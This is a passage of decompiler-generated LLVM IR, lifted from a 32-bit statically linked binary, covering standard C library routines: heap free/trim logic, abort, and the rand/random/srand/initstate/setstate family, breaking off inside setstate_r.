  %v2_8051020 = icmp eq i32 %v1_8051020, 0
  store i32 %v1_8051020, i32* %eax.global-to-local, align 4
  %v1_8051025 = icmp eq i1 %v2_8051020, false
  br i1 %v1_8051025, label %dec_label_pc_8051046, label %dec_label_pc_8051027

dec_label_pc_8051027:                             ; preds = %dec_label_pc_8051019
  %v0_8051027 = load i32, i32* @esi, align 4
  %v1_8051027 = add i32 %v0_8051027, 8
  %v2_8051027 = inttoptr i32 %v1_8051027 to i32*
  %v3_8051027 = load i32, i32* %v2_8051027, align 4
  store i32 %v3_8051027, i32* @edx, align 4
  %v1_805102a = add i32 %v0_8051027, 12
  %v2_805102a = inttoptr i32 %v1_805102a to i32*
  %v3_805102a = load i32, i32* %v2_805102a, align 4
  store i32 %v3_805102a, i32* %eax.global-to-local, align 4
  %v1_805102d = add i32 %v3_8051027, 12
  %v2_805102d = inttoptr i32 %v1_805102d to i32*
  %v3_805102d = load i32, i32* %v2_805102d, align 4
  store i32 %v3_805102d, i32* @edi, align 4
  %v12_8051030 = icmp eq i32 %v3_805102d, %v0_8051027
  %v1_8051032 = icmp eq i1 %v12_8051030, false
  br i1 %v1_8051032, label %dec_label_pc_8051039, label %dec_label_pc_8051034

dec_label_pc_8051034:                             ; preds = %dec_label_pc_8051027
  %v1_8051034 = add i32 %v3_805102a, 8
  %v2_8051034 = inttoptr i32 %v1_8051034 to i32*
  %v3_8051034 = load i32, i32* %v2_8051034, align 4
  %v15_8051034 = icmp eq i32 %v3_8051034, %v3_805102d
  br i1 %v15_8051034, label %dec_label_pc_805103e, label %dec_label_pc_8051039

dec_label_pc_8051039:                             ; preds = %dec_label_pc_8051034, %dec_label_pc_8051027, %dec_label_pc_8050ffd, %dec_label_pc_8050fe9
  %v0_8051039 = call i32 @abort()
  store i32 %v0_8051039, i32* %eax.global-to-local, align 4
  %v1_805103e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805103e

dec_label_pc_805103e:                             ; preds = %dec_label_pc_8051034, %dec_label_pc_8051039
  %v1_805103e = phi i32 [ %v3_8051027, %dec_label_pc_8051034 ], [ %v1_805103e.pre, %dec_label_pc_8051039 ]
  %v0_805103e = phi i32 [ %v3_805102a, %dec_label_pc_8051034 ], [ %v0_8051039, %dec_label_pc_8051039 ]
  %v2_805103e = add i32 %v1_805103e, 12
  %v3_805103e = inttoptr i32 %v2_805103e to i32*
  store i32 %v0_805103e, i32* %v3_805103e, align 4
  %v0_8051041 = load i32, i32* @ebx, align 4
  %v1_8051041 = load i32, i32* @ebp, align 4
  %v2_8051041 = add i32 %v1_8051041, %v0_8051041
  store i32 %v2_8051041, i32* @ebx, align 4
  %v0_8051043 = load i32, i32* @edx, align 4
  %v1_8051043 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051043 = add i32 %v1_8051043, 8
  %v3_8051043 = inttoptr i32 %v2_8051043 to i32*
  store i32 %v0_8051043, i32* %v3_8051043, align 4
  br label %dec_label_pc_8051046

dec_label_pc_8051046:                             ; preds = %dec_label_pc_8051019, %dec_label_pc_805103e
  %v0_8051046 = load i32, i32* @global_var_80603dc.207, align 4
  store i32 %v0_8051046, i32* %eax.global-to-local, align 4
  %v0_805104b = load i32, i32* @ecx, align 4
  %v1_805104b = add i32 %v0_805104b, 12
  %v2_805104b = inttoptr i32 %v1_805104b to i32*
  store i32 ptrtoint (i32* @global_var_80603d4.191 to i32), i32* %v2_805104b, align 4
  %v0_8051052 = load i32, i32* @ebx, align 4
  %v1_8051052 = load i32, i32* @ecx, align 4
  %v3_8051052 = add i32 %v1_8051052, %v0_8051052
  %v4_8051052 = inttoptr i32 %v3_8051052 to i32*
  store i32 %v0_8051052, i32* %v4_8051052, align 4
  %v0_8051055 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051055 = load i32, i32* @ecx, align 4
  %v2_8051055 = add i32 %v1_8051055, 8
  %v3_8051055 = inttoptr i32 %v2_8051055 to i32*
  store i32 %v0_8051055, i32* %v3_8051055, align 4
  %v0_8051058 = load i32, i32* @ecx, align 4
  %v1_8051058 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051058 = add i32 %v1_8051058, 12
  %v3_8051058 = inttoptr i32 %v2_8051058 to i32*
  store i32 %v0_8051058, i32* %v3_8051058, align 4
  %v0_805105b = load i32, i32* @ebx, align 4
  %v1_805105d = or i32 %v0_805105b, 1
  store i32 %v1_805105d, i32* %eax.global-to-local, align 4
  %v0_8051060 = load i32, i32* @ecx, align 4
  store i32 %v0_8051060, i32* @global_var_80603dc.207, align 4
  %v2_8051066 = add i32 %v0_8051060, 4
  %v3_8051066 = inttoptr i32 %v2_8051066 to i32*
  store i32 %v1_805105d, i32* %v3_8051066, align 4
  br label %dec_label_pc_805107b

dec_label_pc_805106b:                             ; preds = %dec_label_pc_805100a
  %v0_805106b = load i32, i32* @ebx, align 4
  %v2_805106b = add i32 %v0_805106b, %v1_805100e
  store i32 %v2_805106b, i32* @ebx, align 4
  %v1_805106f = or i32 %v2_805106b, 1
  store i32 %v1_805106f, i32* %eax.global-to-local, align 4
  %v1_8051072 = load i32, i32* @ecx, align 4
  %v2_8051072 = add i32 %v1_8051072, 4
  %v3_8051072 = inttoptr i32 %v2_8051072 to i32*
  store i32 %v1_805106f, i32* %v3_8051072, align 4
  %v0_8051075 = load i32, i32* @ecx, align 4
  store i32 %v0_8051075, i32* @global_var_80603cc.189, align 4
  br label %dec_label_pc_805107b

dec_label_pc_805107b:                             ; preds = %dec_label_pc_8051046, %dec_label_pc_805106b
  %v0_805107b = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805107b, 131072
  br i1 %tmp, label %dec_label_pc_80510e0, label %dec_label_pc_8051083

dec_label_pc_8051083:                             ; preds = %dec_label_pc_805107b
  %v0_8051083 = load i8, i8* @global_var_80603a0.188, align 32
  %v1_8051083 = and i8 %v0_8051083, 2
  %v2_8051083 = icmp eq i8 %v1_8051083, 0
  br i1 %v2_8051083, label %dec_label_pc_805109c, label %dec_label_pc_805108c

dec_label_pc_805108c:                             ; preds = %dec_label_pc_8051083
  %v2_8051094 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80603a0.188 to i32*))
  store i32 %v2_8051094, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805109c

dec_label_pc_805109c:                             ; preds = %dec_label_pc_8051083, %dec_label_pc_805108c
  %v0_805109c = load i32, i32* @global_var_80603cc.189, align 4
  store i32 %v0_805109c, i32* %eax.global-to-local, align 4
  %v1_80510a1 = add i32 %v0_805109c, 4
  %v2_80510a1 = inttoptr i32 %v1_80510a1 to i32*
  %v3_80510a1 = load i32, i32* %v2_80510a1, align 4
  %v1_80510a4 = and i32 %v3_80510a1, -4
  store i32 %v1_80510a4, i32* %eax.global-to-local, align 4
  %v1_80510a7 = load i32, i32* @global_var_80606e4.205, align 4
  %v7_80510a7 = icmp ult i32 %v1_80510a4, %v1_80510a7
  br i1 %v7_80510a7, label %dec_label_pc_80510e0, label %dec_label_pc_80510af

dec_label_pc_80510af:                             ; preds = %dec_label_pc_805109c
  %v0_80510af = load i32, i32* @global_var_80606e8.203, align 8
  store i32 %v0_80510af, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32* @edx, align 4
  %v0_80510b9 = call i32 @__malloc_trim()
  store i32 %v0_80510b9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510e0

dec_label_pc_80510c0:                             ; preds = %dec_label_pc_8050fc8
  %v2_80510c0 = inttoptr i32 %v1_8050f91 to i32*
  %v3_80510c0 = load i32, i32* %v2_80510c0, align 4
  %v0_80510c3 = load i32, i32* @global_var_80606f0.196, align 16
  %v1_80510c3 = add i32 %v0_80510c3, -1
  store i32 %v1_80510c3, i32* @global_var_80606f0.196, align 16
  %v2_80510c9 = add i32 %v3_80510c0, %v1_8050fa1
  store i32 %v2_80510c9, i32* %eax.global-to-local, align 4
  %v2_80510cc = sub i32 %v1_8050f91, %v3_80510c0
  %v0_80510d2 = load i32, i32* @global_var_8060704.200, align 4
  %v2_80510d2 = sub i32 %v0_80510d2, %v2_80510c9
  store i32 %v2_80510d2, i32* @global_var_8060704.200, align 4
  %v4_80510d8 = call i32 @munmap(i32 %v2_80510cc, i32 %v2_80510c9, i32 %v1_8050fa1, i32 %v1_8050fa1)
  store i32 %v4_80510d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510e0

dec_label_pc_80510e0:                             ; preds = %dec_label_pc_805109c, %dec_label_pc_805107b, %dec_label_pc_80510af, %dec_label_pc_8050fa8, %dec_label_pc_80510c0
  store i32 %v2_8050f7b, i32* @eax, align 4
  %v2_80510e9 = call i32 @__pthread_return_void(i32 %v2_8050f7b, i32 1)
  store i32 %v2_80510e9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510f1

dec_label_pc_80510f1:                             ; preds = %entry, %dec_label_pc_80510e0
  %.0 = phi i32 [ undef, %entry ], [ %v2_80510e9, %dec_label_pc_80510e0 ]
  store i32 %v0_8050f60, i32* @ebx, align 4
  store i32 %v0_8050f5f, i32* @esi, align 4
  store i32 %v0_8050f5e, i32* @edi, align 4
  store i32 %v0_8050f5d, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80510c0, { 1, 0 }
  uselistorder i32 %v0_8051052, { 1, 0 }
  uselistorder i32 %v1_8051020, { 1, 0 }
  uselistorder i32 %v2_8051019, { 1, 0 }
  uselistorder i32 %v1_805100e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805101d, { 1, 0 }
  uselistorder i32 %v1_8050fa1, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050f99, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050f91, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_80603a0.188 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80603d4.191 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80603cc.189, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8059f30.187 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_80510f1, { 1, 0 }
  uselistorder label %dec_label_pc_80510e0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805109c, { 1, 0 }
  uselistorder label %dec_label_pc_805107b, { 1, 0 }
  uselistorder label %dec_label_pc_8051046, { 1, 0 }
  uselistorder label %dec_label_pc_805103e, { 1, 0 }
  uselistorder label %dec_label_pc_805100a, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80510f9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8051106 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80603a0.188 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_80603a0.188 to i32), i32* @edx, align 4
  %v0_8051113 = load i32, i32* @ebx, align 4
  store i32 %v0_8051113, i32* @eax, align 4
  store i32 %v0_80510f9, i32* @ebx, align 4
  %v0_8051116 = call i32 @__malloc_trim()
  ret i32 %v0_8051116

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80603a0.188 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80603a0.188, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8051128 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f48.208 to i32))
  %v12_8051132 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051137

dec_label_pc_8051137:                             ; preds = %dec_label_pc_8051137.dec_label_pc_8051137_crit_edge, %entry
  %v0_8051137 = phi i32 [ %v12_8051132, %entry ], [ %v0_8051137.pre, %dec_label_pc_8051137.dec_label_pc_8051137_crit_edge ]
  %v1_805114219 = phi i32 [ 31, %entry ], [ %v1_8051142, %dec_label_pc_8051137.dec_label_pc_8051137_crit_edge ]
  %v2_8051137 = mul i32 %v1_805114219, 4
  %v3_8051137 = add i32 %v2_8051137, 152
  %v4_8051137 = add i32 %v3_8051137, %v0_8051137
  %v5_8051137 = inttoptr i32 %v4_8051137 to i32*
  store i32 0, i32* %v5_8051137, align 4
  %v0_8051142.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051142 = add i32 %v0_8051142.pre, -1
  %v9_8051142 = icmp slt i32 %v1_8051142, 0
  store i32 %v1_8051142, i32* %eax.global-to-local, align 4
  %v1_8051143 = icmp eq i1 %v9_8051142, false
  br i1 %v1_8051143, label %dec_label_pc_8051137.dec_label_pc_8051137_crit_edge, label %dec_label_pc_8051145

dec_label_pc_8051137.dec_label_pc_8051137_crit_edge: ; preds = %dec_label_pc_8051137
  %v0_8051137.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051137

dec_label_pc_8051145:                             ; preds = %dec_label_pc_8051137
  %v0_8051145 = load i32, i32* @ebx, align 4
  %v2_8051149 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8051149, i32* @ebx, align 4
  %v4_8051151 = call i32 @__sigaddset(i32 %v2_8051149, i32 6, i32 %v0_8051145, i32 %v0_8051145)
  store i32 %v4_8051151, i32* %eax.global-to-local, align 4
  %v1_8051159 = icmp eq i32 %v4_8051151, 0
  %v1_805115b = icmp eq i1 %v1_8051159, false
  br i1 %v1_805115b, label %dec_label_pc_805116b, label %dec_label_pc_805115d

dec_label_pc_805115d:                             ; preds = %dec_label_pc_8051145
  %v3_8051163 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8051163 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8051163, i32 0)
  store i32 %v4_8051163, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805116b

dec_label_pc_805116b:                             ; preds = %dec_label_pc_8051145, %dec_label_pc_805115d
  %v2_80511a34 = phi i32 [ %v4_8051151, %dec_label_pc_8051145 ], [ %v4_8051163, %dec_label_pc_805115d ]
  %v0_805116b = load i8, i8* @global_var_80602c0.209, align 64
  %v1_805116b = icmp eq i8 %v0_805116b, 0
  %v1_8051172 = icmp eq i1 %v1_805116b, false
  br i1 %v1_8051172, label %dec_label_pc_80511a3, label %dec_label_pc_8051174

dec_label_pc_8051174:                             ; preds = %dec_label_pc_805116b
  store i8 1, i8* @global_var_80602c0.209, align 64
  br label %dec_label_pc_805117b

dec_label_pc_805117b:                             ; preds = %dec_label_pc_80511e2, %dec_label_pc_8051174
  %v1_8051183 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f48.208 to i32))
  store i32 %v1_8051183, i32* %eax.global-to-local, align 4
  %v1_805118f = call i32 @__raise(i32 6)
  store i32 %v1_805118f, i32* %eax.global-to-local, align 4
  %v1_805119b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f48.208 to i32))
  store i32 %v1_805119b, i32* %eax.global-to-local, align 4
  %v0_80511a3.pre = load i8, i8* @global_var_80602c0.209, align 64
  br label %dec_label_pc_80511a3

dec_label_pc_80511a3:                             ; preds = %dec_label_pc_805116b, %dec_label_pc_805117b
  %v2_80511a3 = phi i32 [ %v2_80511a34, %dec_label_pc_805116b ], [ %v1_805119b, %dec_label_pc_805117b ]
  %v0_80511a3 = phi i8 [ %v0_805116b, %dec_label_pc_805116b ], [ %v0_80511a3.pre, %dec_label_pc_805117b ]
  %v1_80511a3 = zext i8 %v0_80511a3 to i32
  %v3_80511a3 = and i32 %v2_80511a3, -256
  %v4_80511a3 = or i32 %v1_80511a3, %v3_80511a3
  store i32 %v4_80511a3, i32* %eax.global-to-local, align 4
  %v10_80511a8 = icmp eq i8 %v0_80511a3, 1
  %v1_80511aa = icmp eq i1 %v10_80511a8, false
  br i1 %v1_80511aa, label %dec_label_pc_8051204, label %dec_label_pc_80511ac

dec_label_pc_80511ac:                             ; preds = %dec_label_pc_80511a3
  %v2_80511b4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80511b4, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_80602c0.209, align 64
  %v3_80511c0 = bitcast i32* %stack_var_-272 to i8*
  %v4_80511c0 = call i32 @__GI_memset(i8* %v3_80511c0, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511d7

dec_label_pc_80511d7:                             ; preds = %dec_label_pc_80511d7.dec_label_pc_80511d7_crit_edge, %dec_label_pc_80511ac
  %v0_80511d7 = phi i32 [ %v12_8051132, %dec_label_pc_80511ac ], [ %v0_80511d7.pre, %dec_label_pc_80511d7.dec_label_pc_80511d7_crit_edge ]
  %v1_80511df18 = phi i32 [ 31, %dec_label_pc_80511ac ], [ %v1_80511df, %dec_label_pc_80511d7.dec_label_pc_80511d7_crit_edge ]
  %v2_80511d7 = mul i32 %v1_80511df18, 4
  %v3_80511d7 = add i32 %v2_80511d7, 16
  %v4_80511d7 = add i32 %v3_80511d7, %v0_80511d7
  %v5_80511d7 = inttoptr i32 %v4_80511d7 to i32*
  store i32 -1, i32* %v5_80511d7, align 4
  %v0_80511df.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80511df = add i32 %v0_80511df.pre, -1
  %v9_80511df = icmp slt i32 %v1_80511df, 0
  store i32 %v1_80511df, i32* %eax.global-to-local, align 4
  %v1_80511e0 = icmp eq i1 %v9_80511df, false
  br i1 %v1_80511e0, label %dec_label_pc_80511d7.dec_label_pc_80511d7_crit_edge, label %dec_label_pc_80511e2

dec_label_pc_80511d7.dec_label_pc_80511d7_crit_edge: ; preds = %dec_label_pc_80511d7
  %v0_80511d7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80511d7

dec_label_pc_80511e2:                             ; preds = %dec_label_pc_80511d7
  store i32 %v2_80511b4, i32* %eax.global-to-local, align 4
  %v4_80511f7 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80511f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805117b

dec_label_pc_8051204:                             ; preds = %dec_label_pc_80511a3
  %v10_8051204 = icmp eq i8 %v0_80511a3, 2
  %v1_8051206 = icmp eq i1 %v10_8051204, false
  br i1 %v1_8051206, label %dec_label_pc_8051210, label %dec_label_pc_8051208

dec_label_pc_8051208:                             ; preds = %dec_label_pc_8051204
  store i8 3, i8* @global_var_80602c0.209, align 64
  br label %dec_label_pc_8051210

dec_label_pc_8051210:                             ; preds = %dec_label_pc_8051204, %dec_label_pc_8051208
  %v0_8051210 = phi i8 [ %v0_80511a3, %dec_label_pc_8051204 ], [ 3, %dec_label_pc_8051208 ]
  %v9_8051210 = icmp eq i8 %v0_8051210, 3
  %v1_8051217 = icmp eq i1 %v9_8051210, false
  br i1 %v1_8051217, label %dec_label_pc_805122a, label %dec_label_pc_8051219

dec_label_pc_8051219:                             ; preds = %dec_label_pc_8051210
  store i8 4, i8* @global_var_80602c0.209, align 64
  %v1_8051225 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805122a:                             ; preds = %dec_label_pc_8051210, %dec_label_pc_805122a
  br label %dec_label_pc_805122a

; uselistorder directives
  uselistorder i32 %v1_80511df, { 2, 1, 0 }
  uselistorder i8 %v0_80511a3, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8051142, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 8, 7, 0, 9, 10, 11, 12, 13, 14, 2, 4, 3, 1 }
  uselistorder i8 3, { 0, 3, 5, 4, 1, 2 }
  uselistorder i8* @global_var_80602c0.209, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805122a, { 1, 0 }
  uselistorder label %dec_label_pc_8051210, { 1, 0 }
  uselistorder label %dec_label_pc_80511a3, { 1, 0 }
  uselistorder label %dec_label_pc_805116b, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8051230 = call i32 @random()
  ret i32 %v0_8051230

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 0, 4, 3, 2, 1, 8, 7, 6, 5, 10, 9 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051238 = load i32, i32* @ebx, align 4
  store i32 %v0_8051238, i32* %stack_var_-4, align 4
  %v2_8051246 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051246, i32* @ebx, align 4
  %v2_805124b = call i32 @__pthread_return_void(i32 %v2_8051246, i32 134552351)
  %v1_8051257 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f60.210 to i32))
  %v2_805125e = ptrtoint i32* %stack_var_-8 to i32
  %v3_8051268 = call i32 @__GI_random_r(i32* nonnull @global_var_8059f78, i32 %v2_805125e)
  store i32 ptrtoint (i32* @global_var_8059f78 to i32), i32* @eax, align 4
  %v2_8051272 = call i32 @__pthread_return_void(i32 %v2_8051246, i32 1)
  %v3_8051277 = load i32, i32* %stack_var_-8, align 4
  %v2_805127e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805127e, i32* @ebx, align 4
  ret i32 %v3_8051277
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8051291 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051291, i32* @eax, align 4
  %v2_8051296 = call i32 @__pthread_return_void(i32 %v2_8051291, i32 134552351)
  %v1_80512a2 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f60.210 to i32))
  %v0_80512a7 = load i32, i32* bitcast (i32** @global_var_8059f80.213 to i32*), align 128
  store i32 %v0_80512a7, i32* @ebx, align 4
  %v3_80512b8 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8059f78)
  %v2_80512c0 = icmp slt i32 %v3_80512b8, 0
  br i1 %v2_80512c0, label %dec_label_pc_80512c7, label %dec_label_pc_80512c4

dec_label_pc_80512c4:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_8059f7c.214 to i32), i32* @esi, align 4
  br label %dec_label_pc_80512c7

dec_label_pc_80512c7:                             ; preds = %entry, %dec_label_pc_80512c4
  store i32 %v2_8051291, i32* @eax, align 4
  %v2_80512d0 = call i32 @__pthread_return_void(i32 %v2_8051291, i32 1)
  %v0_80512d8 = load i32, i32* @esi, align 4
  ret i32 %v0_80512d8

; uselistorder directives
  uselistorder label %dec_label_pc_80512c7, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80512ec = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80512ec, i32* @ebx, align 4
  %v2_80512f1 = call i32 @__pthread_return_void(i32 %v2_80512ec, i32 134552351)
  %v1_80512fd = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f60.210 to i32))
  store i32 ptrtoint (i32** @global_var_8059f7c.214 to i32), i32* @esi, align 4
  %v4_805131c = inttoptr i32 %arg2 to i32*
  %v5_805131c = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_805131c, i32 %arg3, i32 ptrtoint (i32* @global_var_8059f78 to i32))
  store i32 %v5_805131c, i32* @eax, align 4
  %v2_8051327 = call i32 @__pthread_return_void(i32 %v2_80512ec, i32 1)
  %v0_805132f = load i32, i32* @esi, align 4
  ret i32 %v0_805132f
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051334 = load i32, i32* @ebx, align 4
  store i32 %v0_8051334, i32* %stack_var_-4, align 4
  %v2_8051342 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051342, i32* @ebx, align 4
  %v2_8051347 = call i32 @__pthread_return_void(i32 %v2_8051342, i32 134552351)
  %v1_8051353 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059f60.210 to i32))
  %v3_8051363 = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8059f78)
  store i32 ptrtoint (i32* @global_var_8059f78 to i32), i32* @eax, align 4
  %v2_805136d = call i32 @__pthread_return_void(i32 %v2_8051342, i32 1)
  %v2_8051375 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051375, i32* @ebx, align 4
  ret i32 %v2_805136d

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8059f78 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8059f78, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_805137b = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8051387 = add i32 %tmp3, 12
  %v2_8051387 = inttoptr i32 %v1_8051387 to i32*
  %v3_8051387 = load i32, i32* %v2_8051387, align 4
  store i32 %v3_8051387, i32* %ecx.global-to-local, align 4
  %v1_805138a = add i32 %arg1, 4
  store i32 %v1_805138a, i32* %esi.global-to-local, align 4
  %v1_805138d = add i32 %tmp3, 8
  %v2_805138d = inttoptr i32 %v1_805138d to i32*
  %v3_805138d = load i32, i32* %v2_805138d, align 4
  %v1_8051390 = icmp eq i32 %v3_8051387, 0
  %v1_8051392 = icmp eq i1 %v1_8051390, false
  br i1 %v1_8051392, label %dec_label_pc_805139d, label %dec_label_pc_8051394

dec_label_pc_8051394:                             ; preds = %entry
  %v1_8051394 = add i32 %v3_805138d, -4
  %v2_8051394 = inttoptr i32 %v1_8051394 to i32*
  store i32 0, i32* %v2_8051394, align 4
  br label %dec_label_pc_80513ad

dec_label_pc_805139d:                             ; preds = %entry
  %v1_805139d = add i32 %tmp3, 4
  %v2_805139d = inttoptr i32 %v1_805139d to i32*
  %v3_805139d = load i32, i32* %v2_805139d, align 4
  %v2_80513a0 = sub i32 %v3_805139d, %v3_805138d
  %v2_80513a2 = sdiv i32 %v2_80513a0, 4
  %v3_80513a5 = mul i32 %v2_80513a2, 5
  %v2_80513a8 = add i32 %v3_80513a5, %v3_8051387
  store i32 %v2_80513a8, i32* %eax.global-to-local, align 4
  %v2_80513aa = add i32 %v3_805138d, -4
  %v3_80513aa = inttoptr i32 %v2_80513aa to i32*
  store i32 %v2_80513a8, i32* %v3_80513aa, align 4
  br label %dec_label_pc_80513ad

dec_label_pc_80513ad:                             ; preds = %dec_label_pc_8051394, %dec_label_pc_805139d
  %v0_80513ad = load i32, i32* %esi.global-to-local, align 4
  %v1_80513ad = add i32 %v0_80513ad, -4
  %v2_80513ad = inttoptr i32 %v1_80513ad to i32*
  %v3_80513ad = load i32, i32* %v2_80513ad, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80513b5 = ashr i32 %v3_80513ad, 31
  %v2_80513b6 = zext i32 %v3_80513ad to i64
  %v4_80513b6 = zext i32 %v1_80513b5 to i64
  %v5_80513b6 = mul nuw i64 %v4_80513b6, 4294967296
  %v6_80513b6 = or i64 %v5_80513b6, %v2_80513b6
  %v8_80513b6 = sdiv i64 %v6_80513b6, 5
  %v9_80513b6 = trunc i64 %v8_80513b6 to i32
  store i32 %v9_80513b6, i32* %eax.global-to-local, align 4
  %v10_80513b6 = srem i64 %v6_80513b6, 5
  %v11_80513b6 = trunc i64 %v10_80513b6 to i32
  %v6_80513bb = icmp ugt i32 %v11_80513b6, 4
  br i1 %v6_80513bb, label %dec_label_pc_80513fb, label %dec_label_pc_80513bd

dec_label_pc_80513bd:                             ; preds = %dec_label_pc_80513ad
  %v1_80513bd = mul i32 %v11_80513b6, 4
  %v2_80513bd = add i32 %v1_80513bd, ptrtoint (i32* @global_var_8057fb4.215 to i32)
  %v3_80513bd = inttoptr i32 %v2_80513bd to i32*
  %v4_80513bd = load i32, i32* %v3_80513bd, align 4
  store i32 %v4_80513bd, i32* %ecx.global-to-local, align 4
  %v1_80513c4 = icmp eq i32 %v11_80513b6, 0
  %v2_80513c6 = add i32 %v1_80513bd, ptrtoint (i32* @global_var_8057fa0.216 to i32)
  %v3_80513c6 = inttoptr i32 %v2_80513c6 to i32*
  %v4_80513c6 = load i32, i32* %v3_80513c6, align 4
  store i32 %v4_80513c6, i32* %ebp.global-to-local, align 4
  %v1_80513cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513cd = add i32 %v1_80513cd, 12
